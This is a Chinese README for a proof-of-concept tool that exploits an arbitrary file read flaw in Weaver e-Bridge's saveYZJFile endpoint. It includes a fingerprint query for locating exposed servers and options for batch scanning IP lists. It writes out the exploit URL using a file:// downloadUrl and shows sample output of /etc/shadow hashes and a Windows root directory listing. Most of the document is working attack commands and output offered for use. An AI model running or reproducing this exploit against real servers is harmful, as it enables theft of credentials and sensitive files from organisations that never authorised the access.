# fanweiOA-saveYZJFile任意文件读取漏洞

# 漏洞描述
泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。

# 影响版本
泛微云桥 e-Bridge 2018-2019 多个版本

# 网络测绘
title="泛微云桥e-Bridge"

# 使用方法
```shell
optional arguments:
  -h, --help                    show this help message and exit
  -i IP, --ip IP                单个ip地址
  -l LIST, --list LIST          ip列表 - 批量扫描
  -t TARGET, --target TARGET    访问的目录或文件 - 完整路径
```


# 例子
```shell
python poc.py -i xx.xx.xx.xx

[+] E-Bridge saveYZJFile任意文件读取漏洞 OS: linux http://xx.xx.xx.xx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
[+] http://xx.xx.xx.xx maybe vulnerable
```

Linux系统
```shell
python poc.py -i xx.xx.xx.xx -t etc/shadow

[+] E-Bridge saveYZJFile任意文件读取漏洞 OS: linux http://xx.xx.xx.xx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
[+] http://xx.xx.xx.xx maybe vulnerable

------------results------------
root:*:19001:0:99999:7:::
bin:*:15980:0:99999:7:::
daemon:*:15980:0:99999:7:::
adm:*:15980:0:99999:7:::
......
```

Windows系统
```shell
python poc.py -i http://xx.xx.xx.xx:8088 -t C:\

[+] E-Bridge saveYZJFile任意文件读取漏洞 OS: windows http://xx.xx.xx.xx:8088/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt
[+] http://xx.xx.xx.xx:8088 maybe vulnerable

------------results------------
$Recycle.Bin
360SANDBOX
Boot
bootmgr
Config.Msi
Documents and Settings
inetpub
pagefile.sys
PerfLogs
ProgramData
Program Files
Program Files (x86)
Recovery
System Volume Information
Users
```




